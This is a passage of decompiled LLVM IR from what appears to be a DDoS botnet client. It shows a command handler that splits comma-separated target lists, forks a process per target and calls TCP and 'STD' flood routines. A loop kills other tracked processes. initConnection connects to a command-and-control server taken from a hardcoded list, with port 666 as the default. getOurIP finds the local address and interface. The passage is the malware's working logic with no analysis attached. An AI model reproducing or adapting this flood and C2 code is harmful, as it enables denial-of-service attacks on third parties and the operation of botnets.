  %v2_dc04 = load i32, i32* %v1_dc04, align 4
  %v2_dc14 = load i32, i32* %v1_db48, align 4
  store i32 %v2_dc14, i32* @r0, align 4
  %v1_dc1c = call i32 @atol(i32 %v2_dc14)
  %v2_dc30 = load i32, i32* %v1_db28, align 4
  store i32 %v2_dc30, i32* @r0, align 4
  %v1_dc38 = call i32 @atol(i32 %v2_dc30)
  %v2_dc4c = load i32, i32* %v1_db68, align 4
  store i32 %v2_dc4c, i32* @r0, align 4
  %v1_dc54 = call i32 @atol(i32 %v2_dc4c)
  %v1_dc64 = add i32 %tmp, 20
  %v1_dc68 = inttoptr i32 %v1_dc64 to i32*
  %v2_dc68 = load i32, i32* %v1_dc68, align 4
  br i1 %v7_dbd0, label %dec_label_pc_dc7c, label %dec_label_pc_dc98

dec_label_pc_dc7c:                                ; preds = %dec_label_pc_dbfc
  %v1_dc80 = add i32 %tmp, 28
  %v1_dc84 = inttoptr i32 %v1_dc80 to i32*
  %v2_dc84 = load i32, i32* %v1_dc84, align 4
  store i32 %v2_dc84, i32* @r0, align 4
  %v1_dc8c = call i32 @atol(i32 %v2_dc84)
  br label %dec_label_pc_dca0

dec_label_pc_dc98:                                ; preds = %dec_label_pc_dbfc
  br label %dec_label_pc_dca0

dec_label_pc_dca0:                                ; preds = %dec_label_pc_dc7c, %dec_label_pc_dc98
  %storemerge5 = phi i32 [ 10, %dec_label_pc_dc98 ], [ %v1_dc8c, %dec_label_pc_dc7c ]
  br i1 %v7_dba8, label %dec_label_pc_dcd0, label %dec_label_pc_dcb4

dec_label_pc_dcb4:                                ; preds = %dec_label_pc_dca0
  %v1_dcb8 = add i32 %tmp, 24
  %v1_dcbc = inttoptr i32 %v1_dcb8 to i32*
  %v2_dcbc = load i32, i32* %v1_dcbc, align 4
  store i32 %v2_dcbc, i32* @r0, align 4
  %v1_dcc4 = call i32 @atol(i32 %v2_dcbc)
  br label %dec_label_pc_dcd8

dec_label_pc_dcd0:                                ; preds = %dec_label_pc_dca0
  br label %dec_label_pc_dcd8

dec_label_pc_dcd8:                                ; preds = %dec_label_pc_dcb4, %dec_label_pc_dcd0
  %storemerge4 = phi i32 [ 0, %dec_label_pc_dcd0 ], [ %v1_dcc4, %dec_label_pc_dcb4 ]
  %v2_dcec = call i32 @__GI_strchr(i32 %v2_dc04, i32 44)
  %v2_dcf4 = icmp eq i32 %v2_dcec, 0
  br i1 %v2_dcf4, label %dec_label_pc_dd80, label %dec_label_pc_dcfc

dec_label_pc_dcfc:                                ; preds = %dec_label_pc_dcd8
  store i32 %v2_dc04, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1976c.206 to i32), i32* @r1, align 4
  %v2_dd08 = call i32 @__GI_strtok(i32 %v2_dc04, i32 ptrtoint (i32* @global_var_1976c.206 to i32))
  %v2_dd7427 = icmp eq i32 %v2_dd08, 0
  br i1 %v2_dd7427, label %dec_label_pc_ddc4, label %dec_label_pc_dd18

dec_label_pc_dd18:                                ; preds = %dec_label_pc_dcfc, %dec_label_pc_dd5c
  %storemerge1328 = phi i32 [ %v2_dd64, %dec_label_pc_dd5c ], [ %v2_dd08, %dec_label_pc_dcfc ]
  %v0_dd18 = call i32 @listFork()
  %v2_dd20 = icmp eq i32 %v0_dd18, 0
  br i1 %v2_dd20, label %dec_label_pc_dd28, label %dec_label_pc_dd5c

dec_label_pc_dd28:                                ; preds = %dec_label_pc_dd18
  %v7_dd50 = call i32 @sendTCP(i32 %storemerge1328, i32 %v1_dc1c, i32 %v1_dc38, i32 %v1_dc54, i32 %v2_dc68, i32 %storemerge4, i32 %storemerge5)
  %v1_dd58 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_dd5c:                                ; preds = %dec_label_pc_dd18
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1976c.206 to i32), i32* @r1, align 4
  %v2_dd64 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1976c.206 to i32))
  %v2_dd74 = icmp eq i32 %v2_dd64, 0
  br i1 %v2_dd74, label %dec_label_pc_ddc4, label %dec_label_pc_dd18

dec_label_pc_dd80:                                ; preds = %dec_label_pc_dcd8
  %v0_dd80 = call i32 @listFork()
  %v2_dd88 = icmp eq i32 %v0_dd80, 0
  br i1 %v2_dd88, label %dec_label_pc_dd90, label %dec_label_pc_ddc4

dec_label_pc_dd90:                                ; preds = %dec_label_pc_dd80
  %v7_ddb8 = call i32 @sendTCP(i32 %v2_dc04, i32 %v1_dc1c, i32 %v1_dc38, i32 %v1_dc54, i32 %v2_dc68, i32 %storemerge4, i32 %storemerge5)
  %v1_ddc0 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_ddc4:                                ; preds = %dec_label_pc_dd5c, %dec_label_pc_dcfc, %dec_label_pc_dd80, %dec_label_pc_daf4
  %v2_ddc8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_197d4.238 to i32), i32* @r1, align 4
  %v3_ddd4 = inttoptr i32 %v2_ddc8 to i8*
  %v4_ddd4 = call i32 @__GI_strcoll(i8* %v3_ddd4, i32 ptrtoint ([4 x i8]* @global_var_197d4.238 to i32))
  %v2_dddc = icmp eq i32 %v4_ddd4, 0
  br i1 %v2_dddc, label %dec_label_pc_dde4, label %dec_label_pc_df28

dec_label_pc_dde4:                                ; preds = %dec_label_pc_ddc4
  %v7_ddec = icmp slt i32 %arg1, 4
  br i1 %v7_ddec, label %dec_label_pc_e040, label %dec_label_pc_ddf0

dec_label_pc_ddf0:                                ; preds = %dec_label_pc_dde4
  %v1_ddf4 = add i32 %tmp, 8
  %v1_ddf8 = inttoptr i32 %v1_ddf4 to i32*
  %v2_ddf8 = load i32, i32* %v1_ddf8, align 4
  store i32 %v2_ddf8, i32* @r0, align 4
  %v1_de00 = call i32 @atol(i32 %v2_ddf8)
  %tmp90 = icmp slt i32 %v1_de00, 1
  br i1 %tmp90, label %dec_label_pc_e040, label %dec_label_pc_de10

dec_label_pc_de10:                                ; preds = %dec_label_pc_ddf0
  %v1_de14 = add i32 %tmp, 12
  %v1_de18 = inttoptr i32 %v1_de14 to i32*
  %v2_de18 = load i32, i32* %v1_de18, align 4
  store i32 %v2_de18, i32* @r0, align 4
  %v1_de20 = call i32 @atol(i32 %v2_de18)
  %v5_de2c = icmp sgt i32 %v1_de20, 0
  br i1 %v5_de2c, label %dec_label_pc_de34, label %dec_label_pc_e040

dec_label_pc_de34:                                ; preds = %dec_label_pc_de10
  %v1_de38 = add i32 %tmp, 4
  %v1_de3c = inttoptr i32 %v1_de38 to i32*
  %v2_de3c = load i32, i32* %v1_de3c, align 4
  %v2_de4c = load i32, i32* %v1_ddf8, align 4
  store i32 %v2_de4c, i32* @r0, align 4
  %v1_de54 = call i32 @atol(i32 %v2_de4c)
  %v2_de68 = load i32, i32* %v1_de18, align 4
  store i32 %v2_de68, i32* @r0, align 4
  %v1_de70 = call i32 @atol(i32 %v2_de68)
  %v2_de88 = call i32 @__GI_strchr(i32 %v2_de3c, i32 44)
  %v2_de90 = icmp eq i32 %v2_de88, 0
  br i1 %v2_de90, label %dec_label_pc_df00, label %dec_label_pc_de98

dec_label_pc_de98:                                ; preds = %dec_label_pc_de34
  store i32 %v2_de3c, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1976c.206 to i32), i32* @r1, align 4
  %v2_dea4 = call i32 @__GI_strtok(i32 %v2_de3c, i32 ptrtoint (i32* @global_var_1976c.206 to i32))
  %v2_def424 = icmp eq i32 %v2_dea4, 0
  br i1 %v2_def424, label %dec_label_pc_df28, label %dec_label_pc_deb4

dec_label_pc_deb4:                                ; preds = %dec_label_pc_de98, %dec_label_pc_dedc
  %storemerge1125 = phi i32 [ %v2_dee4, %dec_label_pc_dedc ], [ %v2_dea4, %dec_label_pc_de98 ]
  %v0_deb4 = call i32 @listFork()
  %v2_debc = icmp eq i32 %v0_deb4, 0
  br i1 %v2_debc, label %dec_label_pc_dec4, label %dec_label_pc_dedc

dec_label_pc_dec4:                                ; preds = %dec_label_pc_deb4
  %v4_ded0 = call i32 @sendSTD(i32 %storemerge1125, i32 %v1_de54, i32 %v1_de70, i32 0)
  %v1_ded8 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_dedc:                                ; preds = %dec_label_pc_deb4
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1976c.206 to i32), i32* @r1, align 4
  %v2_dee4 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1976c.206 to i32))
  %v2_def4 = icmp eq i32 %v2_dee4, 0
  br i1 %v2_def4, label %dec_label_pc_df28, label %dec_label_pc_deb4

dec_label_pc_df00:                                ; preds = %dec_label_pc_de34
  %v0_df00 = call i32 @listFork()
  %v2_df08 = icmp eq i32 %v0_df00, 0
  br i1 %v2_df08, label %dec_label_pc_df10, label %dec_label_pc_e040

dec_label_pc_df10:                                ; preds = %dec_label_pc_df00
  %v4_df1c = call i32 @sendSTD(i32 %v2_de3c, i32 %v1_de54, i32 %v1_de70, i32 0)
  %v1_df24 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_df28:                                ; preds = %dec_label_pc_dedc, %dec_label_pc_de98, %dec_label_pc_ddc4
  %v2_df2c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_197d8.240 to i32), i32* @r1, align 4
  %v3_df38 = inttoptr i32 %v2_df2c to i8*
  %v4_df38 = call i32 @__GI_strcoll(i8* %v3_df38, i32 ptrtoint ([9 x i8]* @global_var_197d8.240 to i32))
  %v2_df40 = icmp eq i32 %v4_df38, 0
  br i1 %v2_df40, label %dec_label_pc_df48, label %dec_label_pc_e040

dec_label_pc_df48:                                ; preds = %dec_label_pc_df28
  br label %dec_label_pc_dfec

dec_label_pc_df5c:                                ; preds = %dec_label_pc_dfec, %dec_label_pc_e020
  %v3_df60 = mul i32 %storemerge9, 4
  %v2_df6c = load i32, i32* @global_var_297b8.68, align 4
  %v2_df70 = add i32 %v2_df6c, %v3_df60
  %v1_df74 = inttoptr i32 %v2_df70 to i32*
  %v2_df74 = load i32, i32* %v1_df74, align 4
  %v2_df78 = icmp eq i32 %v2_df74, 0
  br i1 %v2_df78, label %dec_label_pc_dfe0, label %dec_label_pc_df80

dec_label_pc_df80:                                ; preds = %dec_label_pc_df5c
  %v2_df98 = load i32, i32* %v1_df74, align 4
  store i32 %v2_df98, i32* @r4, align 4
  %v0_df9c = call i32 @__libc_getpid()
  %v0_dfa4 = load i32, i32* @r4, align 4
  %v9_dfa4 = icmp eq i32 %v0_dfa4, %v0_df9c
  br i1 %v9_dfa4, label %dec_label_pc_dfe0, label %dec_label_pc_dfac

dec_label_pc_dfac:                                ; preds = %dec_label_pc_df80
  %v0_dfd0 = call i32 @kill()
  %v1_dfd8 = add i32 %stack_var_-44.1, 1
  br label %dec_label_pc_dfe0

dec_label_pc_dfe0:                                ; preds = %dec_label_pc_df80, %dec_label_pc_df5c, %dec_label_pc_dfac
  %v24_e04434 = phi i32 [ %v24_e04435, %dec_label_pc_df5c ], [ %v0_df9c, %dec_label_pc_df80 ], [ %v0_dfd0, %dec_label_pc_dfac ]
  %stack_var_-44.0 = phi i32 [ %stack_var_-44.1, %dec_label_pc_df5c ], [ %stack_var_-44.1, %dec_label_pc_df80 ], [ %v1_dfd8, %dec_label_pc_dfac ]
  %v1_dfe4 = add i32 %storemerge9, 1
  br label %dec_label_pc_dfec

dec_label_pc_dfec:                                ; preds = %dec_label_pc_df48, %dec_label_pc_dfe0
  %v24_e04435 = phi i32 [ 0, %dec_label_pc_df48 ], [ %v24_e04434, %dec_label_pc_dfe0 ]
  %stack_var_-44.1 = phi i32 [ 0, %dec_label_pc_df48 ], [ %stack_var_-44.0, %dec_label_pc_dfe0 ]
  %storemerge9 = phi i32 [ 0, %dec_label_pc_df48 ], [ %v1_dfe4, %dec_label_pc_dfe0 ]
  %v5_e004 = load i32, i32* @global_var_23538.66, align 4
  %v9_e018 = icmp eq i32 %v5_e004, 0
  br i1 %v9_e018, label %dec_label_pc_e020, label %dec_label_pc_df5c

dec_label_pc_e020:                                ; preds = %dec_label_pc_dfec
  %v2_e004 = load i32, i32* @global_var_23534.65, align 4
  %tmp98 = icmp ugt i32 %v2_e004, %storemerge9
  br i1 %tmp98, label %dec_label_pc_df5c, label %dec_label_pc_e040

dec_label_pc_e040:                                ; preds = %dec_label_pc_e020, %dec_label_pc_da84, %dec_label_pc_da1c, %dec_label_pc_de10, %dec_label_pc_dbd8, %dec_label_pc_d8a8, %dec_label_pc_d640, %dec_label_pc_df00, %dec_label_pc_df28, %dec_label_pc_daa8, %dec_label_pc_d664, %dec_label_pc_d58c, %dec_label_pc_d87c, %dec_label_pc_d854, %dec_label_pc_d834, %dec_label_pc_d814, %dec_label_pc_d7f4, %dec_label_pc_d7d4, %dec_label_pc_d7b4, %dec_label_pc_d7a8, %dec_label_pc_d620, %dec_label_pc_d614, %dec_label_pc_d538, %entry, %dec_label_pc_ddf0, %dec_label_pc_dde4, %dec_label_pc_dbac, %dec_label_pc_db80, %dec_label_pc_db60, %dec_label_pc_db40, %dec_label_pc_db20, %dec_label_pc_db14, %dec_label_pc_d5c4
  %v24_e044 = phi i32 [ %v1_de20, %dec_label_pc_de10 ], [ %v1_dbe8, %dec_label_pc_dbd8 ], [ %v1_d8b8, %dec_label_pc_d8a8 ], [ %v1_d650, %dec_label_pc_d640 ], [ %v0_df00, %dec_label_pc_df00 ], [ %v4_df38, %dec_label_pc_df28 ], [ %v0_daa8, %dec_label_pc_daa8 ], [ %v0_d664, %dec_label_pc_d664 ], [ 0, %dec_label_pc_d58c ], [ %v1_d88c, %dec_label_pc_d87c ], [ %v1_d864, %dec_label_pc_d854 ], [ %v1_d844, %dec_label_pc_d834 ], [ %v1_d824, %dec_label_pc_d814 ], [ %v1_d804, %dec_label_pc_d7f4 ], [ %v1_d7e4, %dec_label_pc_d7d4 ], [ %v1_d7c4, %dec_label_pc_d7b4 ], [ 0, %dec_label_pc_d7a8 ], [ %v1_d630, %dec_label_pc_d620 ], [ 0, %dec_label_pc_d614 ], [ 0, %dec_label_pc_d538 ], [ 0, %entry ], [ %v1_de00, %dec_label_pc_ddf0 ], [ 0, %dec_label_pc_dde4 ], [ %v1_dbbc, %dec_label_pc_dbac ], [ %v1_db90, %dec_label_pc_db80 ], [ %v1_db70, %dec_label_pc_db60 ], [ %v1_db50, %dec_label_pc_db40 ], [ %v1_db30, %dec_label_pc_db20 ], [ 0, %dec_label_pc_db14 ], [ %v0_d59c, %dec_label_pc_d5c4 ], [ 0, %dec_label_pc_da1c ], [ 0, %dec_label_pc_da84 ], [ %v24_e04435, %dec_label_pc_e020 ]
  store i32 %v3_d4c0, i32* @r4, align 4
  store i32 %v6_d4c0, i32* @r5, align 4
  store i32 %v9_d4c0, i32* @r6, align 4
  store i32 %v12_d4c0, i32* @r7, align 4
  store i32 %v15_d4c0, i32* @r8, align 4
  store i32 %v18_d4c0, i32* @fp, align 4
  ret i32 %v24_e044

; uselistorder directives
  uselistorder i32 %stack_var_-44.1, { 0, 2, 1 }
  uselistorder i32 %v2_dee4, { 1, 0 }
  uselistorder i32 %v1_de70, { 1, 0 }
  uselistorder i32 %v1_de54, { 1, 0 }
  uselistorder i32 %v2_de3c, { 2, 1, 0, 3 }
  uselistorder i32 %v2_dd64, { 1, 0 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i32 %storemerge5, { 1, 0 }
  uselistorder i32 %v1_dc54, { 1, 0 }
  uselistorder i32 %v1_dc38, { 1, 0 }
  uselistorder i32 %v1_dc1c, { 1, 0 }
  uselistorder i32 %v2_dc04, { 2, 1, 0, 3 }
  uselistorder i32 %v1_db70, { 1, 0 }
  uselistorder i32 %v1_db50, { 1, 0 }
  uselistorder i32 %v1_db30, { 1, 0 }
  uselistorder i32 %v2_da8c, { 1, 0 }
  uselistorder i32 %storemerge6, { 1, 0 }
  uselistorder i32 %storemerge7, { 1, 0 }
  uselistorder i32 %storemerge8, { 1, 0 }
  uselistorder i32 %v1_d924, { 1, 0 }
  uselistorder i32 %v1_d908, { 1, 0 }
  uselistorder i32 %v1_d8ec, { 1, 0 }
  uselistorder i32 %v2_d8d4, { 2, 1, 0, 3 }
  uselistorder i32 %v1_d824, { 1, 0 }
  uselistorder i32 %v1_d804, { 1, 0 }
  uselistorder i32 %v1_d7e4, { 1, 0 }
  uselistorder i32 %v1_d7c4, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp, { 2, 3, 4, 1, 5, 6, 7, 8, 0, 9, 10, 11, 14, 13, 12, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27 }
  uselistorder i32 (i32, i32, i32, i32)* @sendSTD, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sendTCP, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1976c.206 to i32), { 1, 8, 2, 9, 0, 10, 3, 11, 4, 12, 5, 13, 6, 14, 7, 15 }
  uselistorder i32 1000, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_297b4.224, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_e040, { 0, 8, 7, 3, 24, 25, 4, 26, 27, 28, 29, 30, 31, 9, 1, 2, 5, 12, 13, 14, 15, 16, 17, 18, 19, 10, 6, 20, 21, 32, 11, 22, 23 }
  uselistorder label %dec_label_pc_dfec, { 1, 0 }
  uselistorder label %dec_label_pc_dfe0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_df5c, { 1, 0 }
  uselistorder label %dec_label_pc_deb4, { 1, 0 }
  uselistorder label %dec_label_pc_ddc4, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_dd18, { 1, 0 }
  uselistorder label %dec_label_pc_dcd8, { 1, 0 }
  uselistorder label %dec_label_pc_dca0, { 1, 0 }
  uselistorder label %dec_label_pc_dbfc, { 1, 0 }
  uselistorder label %dec_label_pc_da38, { 1, 0 }
  uselistorder label %dec_label_pc_d9f8, { 1, 0 }
  uselistorder label %dec_label_pc_d9c0, { 1, 0 }
  uselistorder label %dec_label_pc_d97c, { 1, 0 }
  uselistorder label %dec_label_pc_d8cc, { 1, 0 }
  uselistorder label %dec_label_pc_d788, { 1, 0 }
  uselistorder label %dec_label_pc_d568, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4116 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_e088 = load i32, i32* @fp, align 4
  store i32 57488, i32* %stack_var_-4, align 4
  %v2_e08c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_e08c, i32* @fp, align 4
  %v2_e0a0 = ptrtoint i32* %stack_var_-4116 to i32
  store i32 4096, i32* @r2, align 4
  %v2_e0b0 = bitcast i32* %stack_var_-4116 to i8*
  %v3_e0b0 = call i32 @__GI_memset(i8* %v2_e0b0, i32 0)
  %v2_e0b8 = load i32, i32* @global_var_2352c.49, align 4
  %v2_e0bc = icmp eq i32 %v2_e0b8, 0
  br i1 %v2_e0bc, label %dec_label_pc_e0e0, label %dec_label_pc_e0c4

dec_label_pc_e0c4:                                ; preds = %entry
  %v1_e0d0 = call i32 @__libc_close(i32 %v2_e0b8)
  store i32 0, i32* @global_var_2352c.49, align 4
  br label %dec_label_pc_e0e0

dec_label_pc_e0e0:                                ; preds = %entry, %dec_label_pc_e0c4
  %v2_e0e4 = load i32, i32* @global_var_23104.245, align 4
  %v2_e0e8 = icmp eq i32 %v2_e0e4, 0
  br i1 %v2_e0e8, label %dec_label_pc_e114, label %dec_label_pc_e100

dec_label_pc_e100:                                ; preds = %dec_label_pc_e0e0
  %v1_e108 = add i32 %v2_e0e4, 1
  br label %dec_label_pc_e114

dec_label_pc_e114:                                ; preds = %dec_label_pc_e0e0, %dec_label_pc_e100
  %storemerge1 = phi i32 [ %v1_e108, %dec_label_pc_e100 ], [ 0, %dec_label_pc_e0e0 ]
  store i32 %storemerge1, i32* @global_var_23104.245, align 4
  %v4_e12c = mul i32 %storemerge1, 4
  %v5_e12c = add i32 %v4_e12c, ptrtoint ([21 x i8]** @global_var_230b4.247 to i32)
  %v6_e12c = inttoptr i32 %v5_e12c to i32*
  %v7_e12c = load i32, i32* %v6_e12c, align 4
  %v2_e138 = inttoptr i32 %v7_e12c to i8*
  %v3_e138 = call i32 @strcpy(i32 %v2_e0a0, i8* %v2_e138)
  %v2_e15c = call i32 @__GI_strchr(i32 %v2_e0a0, i32 58)
  %v2_e164 = icmp eq i32 %v2_e15c, 0
  br i1 %v2_e164, label %dec_label_pc_e1c4, label %dec_label_pc_e16c

dec_label_pc_e16c:                                ; preds = %dec_label_pc_e114
  %v2_e180 = call i32 @__GI_strchr(i32 %v2_e0a0, i32 58)
  %v1_e188 = add i32 %v2_e180, 1
  store i32 %v1_e188, i32* @r0, align 4
  %v1_e190 = call i32 @atol(i32 %v1_e188)
  %v2_e1b0 = call i32 @__GI_strchr(i32 %v2_e0a0, i32 58)
  %v3_e1c0 = inttoptr i32 %v2_e1b0 to i8*
  store i8 0, i8* %v3_e1c0, align 1
  br label %dec_label_pc_e1c4

dec_label_pc_e1c4:                                ; preds = %dec_label_pc_e114, %dec_label_pc_e16c
  %stack_var_-20.0 = phi i32 [ 666, %dec_label_pc_e114 ], [ %v1_e190, %dec_label_pc_e16c ]
  %v0_e1d0 = call i32 @socket()
  store i32 %v0_e1d0, i32* @global_var_2352c.49, align 4
  %v4_e204 = call i32 @connectTimeout(i32 %v0_e1d0, i32 %v2_e0a0, i32 %stack_var_-20.0, i32 30)
  %v2_e20c = icmp eq i32 %v4_e204, 0
  %. = zext i1 %v2_e20c to i32
  store i32 %v3_e088, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v2_e0a0, { 2, 0, 1, 3, 4 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32)* @atol, { 37, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16 }
  uselistorder label %dec_label_pc_e1c4, { 1, 0 }
  uselistorder label %dec_label_pc_e114, { 1, 0 }
  uselistorder label %dec_label_pc_e0e0, { 1, 0 }
}

define i32 @getOurIP() local_unnamed_addr {
entry:
  %stack_var_-4182 = alloca i32, align 4
  %stack_var_-4200 = alloca i32, align 4
  %stack_var_-4168 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4208 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_e254 = load i32, i32* @fp, align 4
  store i32 %v3_e254, i32* %stack_var_-16, align 4
  %v0_e270 = call i32 @socket()
  %v3_e280 = icmp eq i32 %v0_e270, -1
  br i1 %v3_e280, label %dec_label_pc_e288, label %dec_label_pc_e298

dec_label_pc_e288:                                ; preds = %entry
  br label %dec_label_pc_e500

dec_label_pc_e298:                                ; preds = %entry
  store i32 2, i32* %stack_var_-52, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_197e4.249 to i32), i32* @r0, align 4
  %v2_e2dc = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_197e4.249 to i32))
  %v1_e2ec = call i32 @htons(i32 53)
  %v3_e310 = bitcast i32* %stack_var_-52 to %sockaddr*
  %v4_e310 = call i32 @__libc_connect(i32 %v0_e270, %sockaddr* %v3_e310, i32 16)
  %v3_e320 = icmp eq i32 %v4_e310, -1
  br i1 %v3_e320, label %dec_label_pc_e328, label %dec_label_pc_e338

dec_label_pc_e328:                                ; preds = %dec_label_pc_e298
  br label %dec_label_pc_e500

dec_label_pc_e338:                                ; preds = %dec_label_pc_e298
  store i32 16, i32* %stack_var_-72, align 4
  %v2_e340 = ptrtoint i32* %stack_var_-68 to i32
  %v2_e344 = ptrtoint i32* %stack_var_-72 to i32
  %v5_e350 = bitcast i32* %stack_var_-68 to %sockaddr*
  %v6_e350 = call i32 @__GI_getsockname(i32 %v0_e270, %sockaddr* %v5_e350, i32 %v2_e344, i32 %v2_e340, i32 16)
  %v3_e360 = icmp eq i32 %v6_e350, -1
  br i1 %v3_e360, label %dec_label_pc_e368, label %dec_label_pc_e378

dec_label_pc_e368:                                ; preds = %dec_label_pc_e338
  br label %dec_label_pc_e500

dec_label_pc_e378:                                ; preds = %dec_label_pc_e338
  store i32 ptrtoint (i32* @global_var_297ac.79 to i32), i32* @r2, align 4
  %v4_e38c = call i32 @__libc_open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_197ec.252, i32 0, i32 0), i32 0)
  %v2_e424 = ptrtoint i8* %stack_var_-4168 to i32
  br label %dec_label_pc_e41c

dec_label_pc_e39c:                                ; preds = %dec_label_pc_e41c
  %v8_e3b0 = call i32 @strstr(i32 %v2_e424, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_197fc.254, i32 0, i32 0), i32 %v4_e38c, i32 %v2_e424, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v2_e3b8 = icmp eq i32 %v8_e3b0, 0
  br i1 %v2_e3b8, label %dec_label_pc_e400, label %dec_label_pc_e3e0.preheader

dec_label_pc_e3e0.preheader:                      ; preds = %dec_label_pc_e39c
  %v2_e3e49 = load i8, i8* %stack_var_-4168, align 1
  %v7_e3e813 = icmp eq i8 %v2_e3e49, 9
  br i1 %v7_e3e813, label %dec_label_pc_e3f0, label %dec_label_pc_e3d4

dec_label_pc_e3d4:                                ; preds = %dec_label_pc_e3e0.preheader, %dec_label_pc_e3d4
  %v4_e3e014 = phi i32 [ %v1_e3d8, %dec_label_pc_e3d4 ], [ %v2_e424, %dec_label_pc_e3e0.preheader ]
  %v1_e3d8 = add i32 %v4_e3e014, 1
  %v5_e3dc = inttoptr i32 %v1_e3d8 to i8*
  %v2_e3e4 = load i8, i8* %v5_e3dc, align 1
  %v7_e3e8 = icmp eq i8 %v2_e3e4, 9
  br i1 %v7_e3e8, label %dec_label_pc_e3f0, label %dec_label_pc_e3d4

dec_label_pc_e3f0:                                ; preds = %dec_label_pc_e3d4, %dec_label_pc_e3e0.preheader
  %storemerge3.lcssa = phi i8* [ %stack_var_-4168, %dec_label_pc_e3e0.preheader ], [ %v5_e3dc, %dec_label_pc_e3d4 ]
  store i8 0, i8* %storemerge3.lcssa, align 1
  br label %dec_label_pc_e444

dec_label_pc_e400:                                ; preds = %dec_label_pc_e39c
  store i32 4096, i32* @r2, align 4
  %v3_e418 = call i32 @__GI_memset(i8* nonnull %stack_var_-4168, i32 0)
  br label %dec_label_pc_e41c

dec_label_pc_e41c:                                ; preds = %dec_label_pc_e378, %dec_label_pc_e400
  %v4_e434 = call i32 @fdgets(i32 %v2_e424, i32 4096, i32 %v4_e38c, i32 %v2_e424)
  %v2_e43c = icmp eq i32 %v4_e434, 0
  br i1 %v2_e43c, label %dec_label_pc_e444, label %dec_label_pc_e39c

dec_label_pc_e444:                                ; preds = %dec_label_pc_e41c, %dec_label_pc_e3f0
  %v1_e448 = call i32 @__libc_close(i32 %v4_e38c)
  %v4_e458 = load i8, i8* %stack_var_-4168, align 1
  %v2_e45c = icmp eq i8 %v4_e458, 0
  br i1 %v2_e45c, label %dec_label_pc_e4f4, label %dec_label_pc_e464

dec_label_pc_e464:                                ; preds = %dec_label_pc_e444
  %v2_e46c = ptrtoint i32* %stack_var_-4200 to i32
  %v3_e484 = call i32 @strcpy(i32 %v2_e46c, i8* nonnull %stack_var_-4168)
  %v3_e4a4 = call i32 @ioctl(i32 %v0_e270, i32 35111, i32 %v2_e46c)
  %v2_e4c4 = ptrtoint i32* %stack_var_-4182 to i32
  br label %dec_label_pc_e4b4

dec_label_pc_e4b4:                                ; preds = %dec_label_pc_e464, %dec_label_pc_e4b4
  %storemerge47 = phi i32 [ 0, %dec_label_pc_e464 ], [ %v1_e4e0, %dec_label_pc_e4b4 ]
  %v2_e4cc = add i32 %storemerge47, %v2_e4c4
  %v1_e4d0 = inttoptr i32 %v2_e4cc to i8*
  %v2_e4d0 = load i8, i8* %v1_e4d0, align 1
  %v4_e4d8 = add i32 %storemerge47, ptrtoint (i32* @global_var_2353c.256 to i32)
  %v5_e4d8 = inttoptr i32 %v4_e4d8 to i8*
  store i8 %v2_e4d0, i8* %v5_e4d8, align 1
  %v1_e4e0 = add nuw nsw i32 %storemerge47, 1
  %v7_e4f0 = icmp slt i32 %v1_e4e0, 6
  br i1 %v7_e4f0, label %dec_label_pc_e4b4, label %dec_label_pc_e4f4

dec_label_pc_e4f4:                                ; preds = %dec_label_pc_e4b4, %dec_label_pc_e444
  %v1_e4f8 = call i32 @__libc_close(i32 %v0_e270)
  %v3_e514.pre = load i32, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_e510

dec_label_pc_e500:                                ; preds = %dec_label_pc_e368, %dec_label_pc_e328, %dec_label_pc_e288
  store i32 0, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_e510

dec_label_pc_e510:                                ; preds = %dec_label_pc_e4f4, %dec_label_pc_e500
  %v3_e514 = phi i32 [ %v3_e514.pre, %dec_label_pc_e4f4 ], [ 0, %dec_label_pc_e500 ]
  %v2_e51c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_e51c, i32* @fp, align 4
  ret i32 %v3_e514

; uselistorder directives
  uselistorder i32 %storemerge47, { 2, 1, 0 }
